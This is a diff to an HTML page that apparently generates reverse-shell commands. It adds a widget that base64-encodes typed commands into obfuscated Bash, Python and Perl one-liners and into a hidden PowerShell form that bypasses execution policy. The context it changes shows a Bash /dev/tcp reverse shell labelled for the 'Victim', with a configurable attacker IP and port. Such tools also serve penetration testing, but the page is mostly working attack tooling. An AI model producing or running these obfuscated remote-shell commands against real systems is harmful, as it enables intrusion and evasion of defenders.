@@ -34,10 +34,6 @@ button{
   padding:0 5px;
   margin:0;
 }
-textarea {
-  position: fixed;
-  left: -100%;
-}
 pre{
   font-family: SFMono-Regular,Consolas,Liberation Mono,Menlo,monospace;
   font-size:12px;
@@ -63,6 +59,54 @@ width:200px;
 <body>
 <div class="main">
 
+    <h3>Command Base64 encoding</h3>
+<p>Input type:
+<input type="radio" id="bash" name="option" value="bash" onclick="processInput();" checked=""><label for="bash">Bash</label>
+<input type="radio" id="powershell" name="option" value="powershell" onclick="processInput();"><label for="powershell">PowerShell</label>
+<input type="radio" id="python" name="option" value="python" onclick="processInput();"><label for="python">Python</label>
+<input type="radio" id="perl" name="option" value="perl" onclick="processInput();"><label for="perl">Perl</label></p>
+<p><textarea rows="10" style="width: 100%; box-sizing: border-box;" id="input" placeholder="Type PowerShell here..."></textarea>
+<textarea rows="5" style="width: 100%; box-sizing: border-box;" id="output" onclick="this.focus(); this.select();" readonly=""></textarea></p>
+
+<script>
+  var taInput = document.querySelector('textarea#input');
+  var taOutput = document.querySelector('textarea#output');
+
+  function processInput() {
+    var option = document.querySelector('input[name="option"]:checked').value;
+
+    switch (option) {
+      case 'bash':
+        taInput.placeholder = 'Type Bash here...'
+        taOutput.value = 'bash -c {echo,' + btoa(taInput.value) + '}|{base64,-d}|{bash,-i}';
+        break;
+      case 'powershell':
+        taInput.placeholder = 'Type PowerShell here...'
+        poshInput = ''
+        for (var i = 0; i < taInput.value.length; i++) { poshInput += taInput.value[i] + unescape("%00"); }
+        taOutput.value = 'powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc ' + btoa(poshInput);
+        break;
+      case 'python':
+        taInput.placeholder = 'Type Python here...'
+        taOutput.value = "python -c exec('" + btoa(taInput.value) + "'.decode('base64'))";
+        break;
+      case 'perl':
+        taInput.placeholder = 'Type Perl here...'
+        taOutput.value = "perl -MMIME::Base64 -e eval(decode_base64('" + btoa(taInput.value) + "'))";
+        break;
+      default:
+        taOutput.value = ''
+    }
+
+    if (!taInput.value) taOutput.value = '';
+  }
+
+  taInput.addEventListener('input', processInput, false);
+</script>
+</div>
+
+
+<div class="main">
 IP: <input type="text" id="ip" value="127.0.0.1" name="ip">
 Port: <input type="text" id="port" value="8080" name="port">
 <input type="submit" value="Change" onclick="myFunction()">
@@ -71,19 +115,20 @@ Port: <input type="text" id="port" value="8080" name="port">
     function myFunction(){
       var ip = document.getElementById("ip").value;
       var port = document.getElementById("port").value;
-      console.log(ip);
-      console.log(port);
       var html= document.body.innerHTML;
       html=html.replace(/127\.0\.0\.1/g,ip);           
       html=html.replace(/8080/g,port);
       document.body.innerHTML=html;
+      taInput = document.querySelector('textarea#input');
+      taOutput = document.querySelector('textarea#output');
+      taInput.addEventListener('input', processInput, false);
     }
     function myFunction2(){
       location.reload();
     }
 </script>
 
-<textarea id="txt"></textarea>
+
 <h3>Bash TCP:</h3>
 Victim:
 <pre id="cmd001">bash -i >& /dev/tcp/127.0.0.1/8080 0>&1</pre>
